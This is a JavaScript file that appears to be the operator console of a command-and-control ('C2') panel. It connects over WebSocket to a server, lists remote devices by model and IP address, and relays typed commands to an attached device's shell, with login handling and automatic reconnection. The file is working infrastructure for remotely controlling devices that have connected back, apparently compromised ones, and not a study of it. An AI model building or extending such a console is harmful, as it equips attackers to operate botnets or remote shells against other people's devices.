const term = new Terminal({
    theme: {
        background: '#0a0e27',
        foreground: '#e0e6ed',
        cursor: '#00bcd4',
        selectionBackground: '#1a237e',
        black: '#0a0e27',
        red: '#f44336',
        green: '#4caf50',
        yellow: '#ff9800',
        blue: '#2196f3',
        magenta: '#9c27b0',
        cyan: '#00bcd4',
        white: '#e0e6ed',
        brightBlack: '#2a3f5f',
        brightRed: '#ff5722',
        brightGreen: '#8bc34a',
        brightYellow: '#ffc107',
        brightBlue: '#03a9f4',
        brightMagenta: '#e91e63',
        brightCyan: '#00e5ff',
        brightWhite: '#ffffff'
    },
    fontSize: 13,
    fontFamily: 'Courier New, monospace, "Noto Mono"',
    cursorBlink: true,
    cursorStyle: 'block',
    scrollback: 10000,
    wordWrap: true
});

const fitAddon = new FitAddon.FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById('terminal-container'));
fitAddon.fit();

let ws = null;
let currentSession = null;

let inputBuffer = '';
let inputEnabled = false;

function log(msg) {
    const logs = document.getElementById('logs-content');
    const time = new Date().toLocaleTimeString();
    logs.innerHTML += `<div class="log-entry"><span class="log-time">[${time}]</span> ${msg}</div>`;
    logs.scrollTop = logs.scrollHeight;
    console.log('[C2]', msg);
}

function toggleLogs() {
    document.getElementById('logs-panel').classList.toggle('visible');
}

function connectWS() {
    updateStatus('connecting', 'Connecting...');
    log('Initializing WebSocket connection...');
    
    const wsUrl = 'ws://' + window.location.hostname + ':8444/';
    log('Connecting to: ' + wsUrl);
    
    try {
        ws = new WebSocket(wsUrl);
    } catch (e) {
        log('Failed to create WebSocket: ' + e.message);
        return;
    }
    
    ws.onopen = () => {
        log('WebSocket connected, sending auth...');
        ws.send(JSON.stringify({session_id: session_id}));
    };
    
    ws.onmessage = (event) => {
        log('WebSocket message received: ' + event.data.substring(0, 100));
        
        try {
            const data = JSON.parse(event.data);
            
            switch(data.type) {
                case 'authenticated':
                    updateStatus('online', 'Connected');
                    log('Authenticated successfully');
                    requestSessionsList();
                    break;
                    
                case 'banner':
                    term.write(data.data);
                    break;
                    
                case 'output':
                    term.write(data.data);
                    break;
                    
                case 'attached':
                    currentSession = data.session_id;
                    inputEnabled = true;
                    inputBuffer = '';
                    updateAttachButton();
                    log('Attached to session: ' + data.session_id);
                    break;
                    
                case 'detached':
                    currentSession = null;
                    inputEnabled = false;
                    updateAttachButton();
                    log('Detached from session');
                    term.writeln('\\r\\n[*] Session detached');
                    break;
                    
                case 'sessions_list':
                    log('Received session list: ' + (data.sessions ? data.sessions.length : 0) + ' sessions');
                    updateSessionSelector(data.sessions);
                    break;
                    
                case 'error':
                    if (data.message === 'auth_failed') {
                        log('Authentication failed');
                        sessionStorage.removeItem('c2_auth');
                        alert('Session expired. Please login again.');
                        window.location.href = '/c2/login';
                    } else {
                        term.writeln(`\\r\\n[!] Error: ${data.message}`);
                    }
                    break;
                    
                default:
                    log('Unknown message type: ' + data.type);
            }
        } catch (e) {
            log('Error parsing message: ' + e.message);
            term.write(event.data);
        }
    };
    
    ws.onerror = (err) => {
        log('WebSocket error occurred');
        console.error('WebSocket error:', err);
    };
    
    ws.onclose = (event) => {
        log('WebSocket closed. Code: ' + event.code + ', Reason: ' + event.reason);
        updateStatus('offline', 'Disconnected');
        inputEnabled = false;
        currentSession = null;
        updateAttachButton();
        
        setTimeout(connectWS, 60000);
    };
}

function updateStatus(state, text) {
    const status = document.getElementById('connection-status');
    status.className = 'status ' + state;
    status.querySelector('span:last-child').textContent = text;
}

function updateSessionSelector(sessions) {
    const selector = document.getElementById('session-selector');
    const current = selector.value;
    
    selector.innerHTML = '<option value="">-- Select device --</option>';
    
    if (sessions && sessions.length > 0) {
        sessions.forEach(s => {
            const opt = document.createElement('option');
            opt.value = s.id;
            const time = new Date(s.connected).toLocaleTimeString();
            opt.textContent = s.model + ' @ ' + s.ip + ' (' + time + ')';
            selector.appendChild(opt);
        });
    }
    
    if (current && sessions && sessions.find(s => s.id === current)) {
        selector.value = current;
    }
    
    updateAttachButton();
}

function updateAttachButton() {
    const btn = document.getElementById('attach-btn');
    const selector = document.getElementById('session-selector');
    const hasSelection = selector.value !== '';
    
    if (currentSession) {
        btn.textContent = 'Detach';
        btn.disabled = false;
        btn.onclick = detachSession;
    } else {
        btn.textContent = 'Attach';
        btn.disabled = !hasSelection;
        btn.onclick = attachSession;
    }
}

function attachSession() {
    const sid = document.getElementById('session-selector').value;
    if (!sid) {
        log('No session selected');
        return;
    }
    
    if (ws && ws.readyState === WebSocket.OPEN) {
        log('Attaching to session: ' + sid);
        ws.send(JSON.stringify({action: 'attach', session_id: sid}));
    } else {
        log('WebSocket not connected');
    }
}

function detachSession() {
    if (ws && ws.readyState === WebSocket.OPEN) {
        log('Detaching from session...');
        ws.send(JSON.stringify({action: 'detach'}));
    }
}

function refreshSessions() {
    log('Refreshing sessions...');
    requestSessionsList();
}

function requestSessionsList() {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({action: 'list_sessions'}));
    } else {
        log('Cannot request sessions - WebSocket not open');
    }
}

function logout() {
    sessionStorage.removeItem('c2_auth');
    window.location.href = '/c2/panel';
}


term.onData(e => {
    if (!inputEnabled) {
        if (e === '\\r') {
            term.writeln('\\r\\n[!] No session attached. Select a device first.');
        }
        return;
    }
    
    if (e === '\\r') {
        const cmd = inputBuffer;
        inputBuffer = '';
        ws.send(JSON.stringify({
            action: 'command',
            command: cmd
        }));
    } else if (e === '\\u007F') {
        if (inputBuffer.length > 0) {
            inputBuffer = inputBuffer.slice(0, -1);
            term.write('\\b \\b');
        }
    } else if (e === '\\u0003') {
        inputBuffer = '';
        ws.send(JSON.stringify({
            action: 'command',
            command: ''
        }));
    } else {
        inputBuffer += e;
    }
});

document.getElementById('session-selector').addEventListener('change', updateAttachButton);

window.addEventListener('resize', () => {
    fitAddon.fit();
});

setInterval(() => {
    if (ws && ws.readyState === WebSocket.OPEN && !currentSession) {
        requestSessionsList();
    }
}, 5000);

log('Page loaded, starting WebSocket connection...');
connectWS();